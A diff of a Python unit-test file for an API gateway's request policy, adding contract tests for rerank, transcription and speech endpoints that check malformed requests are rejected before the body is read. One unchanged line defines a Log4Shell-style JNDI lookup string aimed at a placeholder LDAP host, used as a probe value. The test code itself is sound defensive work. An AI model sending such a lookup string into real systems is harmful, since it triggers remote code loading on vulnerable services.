@@ -310,9 +310,66 @@ class ProfilePolicyTests(unittest.TestCase):
                     cases.append(case(label + "-input-" + suffix, **{**base, "body": {**body, "input": native_input}}))
             else:
                 cases.append(case(label + "-reject-api-version", **{**base, "query": {"api-version": "v1"}}))
-                rerank = {"model": "Cohere-rerank-v4.0-fast", "query": "Synthetic query", "documents": ["Synthetic document"]}
-                cases.append(case("cohere-rerank-unchanged", **{**base, "operation": "rerank", "path": "/rerank",
-                    "query": {"texts": "synthetic"}, "headers": {"Content-Type": "text/plain"}, "body": rerank}))
+        cls.native_contract_cases = []
+        cls.native_contract_bodies = {}
+        transcription_body = ('--synthetic-audio-boundary\r\nContent-Disposition: form-data; name="prompt"\r\n\r\n'
+            'Transcribe the synthetic SELECT and <script> examples.\r\n--synthetic-audio-boundary\r\n'
+            'Content-Disposition: form-data; name="file"; filename="synthetic.wav"\r\n'
+            'Content-Type: audio/wav\r\n\r\nRIFF synthetic audio\r\n--synthetic-audio-boundary--\r\n')
+        for label, api, operation, path, kind, body_format, media, raw in (
+            ("rerank", "cohere-inference-v1", "rerank", "/rerank", "rerank", "json", "application/json", None),
+            ("transcription", "openai-audio-v1", "audio-transcriptions", "/deployments/{deployment}/transcriptions",
+             "pathModel", "multipart", "multipart/form-data; boundary=synthetic-audio-boundary", transcription_body),
+            ("speech-tts", "azure-speech-v1", "tts", "/synthesize", "registeredOperation", "text",
+             "application/ssml+xml", '<speak version="1.0"><voice name="synthetic">Synthetic &amp; text.</voice></speak>'),
+            ("speech-stt", "azure-speech-v1", "stt", "/recognize", "registeredOperation", "binary",
+             "audio/wav; codecs=audio/pcm; samplerate=16000", "RIFF synthetic audio")):
+            cls.native_contract_cases.append(label)
+            config = apis[api]["authorization"]
+            body = {"model": "Cohere-rerank-v4.0-fast", "query": "Synthetic SELECT and <script> examples.",
+                    "documents": ["Synthetic document"], "provider_extension": {"synthetic": True}}
+            base = {"config": config, "api": api, "operation": operation, "path": path,
+                    "headers": {"Content-Type": media}, "body": body}
+            if raw is not None:
+                base["rawBody"] = raw
+            if label == "transcription":
+                base["parameters"] = {"deployment": config["operationConstraints"][operation]["allowedModels"][0]}
+            cls.native_contract_bodies[label] = raw if raw is not None else json.dumps(body, separators=(",", ":"))
+            cases.append(case(label + "-native-request", **base))
+            mixed_media = media.replace(media.split(";", 1)[0], media.split(";", 1)[0].upper(), 1)
+            cases.append(case(label + "-mixed-media", **{**base, "headers": {"Content-Type": mixed_media}}))
+            cases.append(case(label + "-revision-request", **{**base, "api": api + ";rev=2"}))
+            for suffix, patch in (
+                ("query", {"query": {"arbitrary": "synthetic"}}),
+                ("excluded-field-query", {"query": {"documents" if label == "rerank" else "prompt": "synthetic"}}),
+                ("duplicate-query", {"query": {"input": ["synthetic", "second"]}}),
+                ("api-version", {"query": {"api-version": "preview"}}),
+                ("query-before-body", {"query": {"input": "synthetic"}, "rawBody": "{"}),
+                ("method", {"method": "GET"}),
+                ("missing-type", {"headers": {}}),
+                ("wrong-type", {"headers": {"Content-Type": "text/plain"}}),
+                ("duplicate-type", {"headers": {"Content-Type": [media, media]}}),
+                ("combined-type", {"headers": {"Content-Type": media.split(";")[0] + ", " + media.split(";")[0]}}),
+                ("wrong-route", {"path": path + "/neighbor"})):
+                cases.append(case(label + "-reject-" + suffix, **{**base, **patch}))
+            for suffix, field, value in (("wrong-kind", "kind", "bodyModel"),
+                                        ("wrong-format", "bodyFormat", "binary" if body_format != "binary" else "text")):
+                changed = json.loads(json.dumps(config))
+                changed["operationConstraints"][operation][field] = value
+                cases.append(case(label + "-reject-" + suffix, **{**base, "config": changed}))
+            cases.append(case(label + "-reject-missing-contract", **{**base,
+                              "config": {**config, "operationConstraints": {}}}))
+            cases.append(case(label + "-revision-query", **{**base, "api": api + ";rev=2", "query": {"input": "synthetic"}}))
+            for suffix, patch in (("other-api", {"api": "another-api"}),
+                                  ("other-operation", {"operation": "synthetic-other", "path": "/synthetic-other",
+                                   "config": {**config, "operationConstraints": {"synthetic-other": config["operationConstraints"][operation]}}})):
+                cases.append(case(label + "-" + suffix, **{**base, **patch,
+                                  "headers": {"Content-Type": "text/plain"}, "query": {"provider-option": "synthetic"}}))
+            if label in ("rerank", "transcription"):
+                future = json.loads(json.dumps(config))
+                future["operationConstraints"][operation]["allowedModels"] = ["synthetic-future-model"]
+                patch = {"body": {**body, "model": "synthetic-future-model"}} if label == "rerank" else {"parameters": {"deployment": "synthetic-future-model"}}
+                cases.append(case(label + "-future-model", **{**base, "config": future, **patch}))
         literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
         cls.decision_body = {"model": "decision-1", "state": {literal: {"text": "Synthetic code example"}},
                              "questions": {literal: {"type": "choice", "instructions": "Review the inert source text.",
@@ -528,11 +585,41 @@ Add-Type -TypeDefinition (Get-Content -Raw (Join-Path $PSScriptRoot 'policy.cs')
             self.assertTrue(result["limits"]["allowed"])
             self.assertTrue(result["targetAllowed"])
             self.assertEqual(json.loads(result["bodyAfter"])["input"], native_input)
-        rerank = self.results["cohere-rerank-unchanged"]
-        self.assertTrue(rerank["requestAllowed"])
-        self.assertTrue(rerank["limits"]["allowed"])
-        self.assertTrue(rerank["targetAllowed"])
-        self.assertEqual(rerank["queryAfter"], {"texts": ["synthetic"]})
+
+    def test_rerank_and_http_audio_reject_query_and_invalid_contracts_before_body_reads(self):
+        for label in self.native_contract_cases:
+            for suffix in ("query", "excluded-field-query", "duplicate-query", "api-version", "query-before-body", "method",
+                           "missing-type", "wrong-type", "duplicate-type", "combined-type", "wrong-route",
+                           "wrong-kind", "wrong-format", "missing-contract"):
+                name = label + "-reject-" + suffix
+                self.assertFalse(self.results[name]["requestAllowed"], name)
+                self.assertEqual(self.results[name]["reads"], 0, name)
+            self.assertFalse(self.results[label + "-revision-query"]["requestAllowed"])
+            self.assertEqual(self.results[label + "-revision-query"]["reads"], 0)
+
+    def test_rerank_and_http_audio_preserve_native_bodies_and_future_models(self):
+        for label in self.native_contract_cases:
+            for suffix in ("native-request", "mixed-media", "revision-request"):
+                name = label + "-" + suffix
+                result = self.results[name]
+                self.assertTrue(result["requestAllowed"], name)
+                for stage in ("profile", "decision", "limits"):
+                    self.assertTrue(result[stage]["allowed"], (name, stage))
+                self.assertTrue(result["targetAllowed"], name)
+                if label == "rerank":
+                    self.assertEqual(json.loads(result["bodyAfter"]), json.loads(self.native_contract_bodies[label]), name)
+                else:
+                    self.assertEqual(result["bodyAfter"], self.native_contract_bodies[label], name)
+                self.assertEqual(result["queryAfter"], {}, name)
+            for suffix in ("other-api", "other-operation"):
+                result = self.results[label + "-" + suffix]
+                self.assertTrue(result["requestAllowed"])
+                self.assertEqual(result["queryAfter"], {"provider-option": ["synthetic"]})
+        for label in ("rerank", "transcription"):
+            result = self.results[label + "-future-model"]
+            self.assertTrue(result["requestAllowed"])
+            self.assertTrue(result["limits"]["allowed"])
+            self.assertTrue(result["targetAllowed"])
 
     def test_decision_contract_rejects_query_or_wrong_media_before_reading_body(self):
         for suffix in ("query", "state-query", "question-key-query", "duplicate-query", "api-version", "query-before-body",
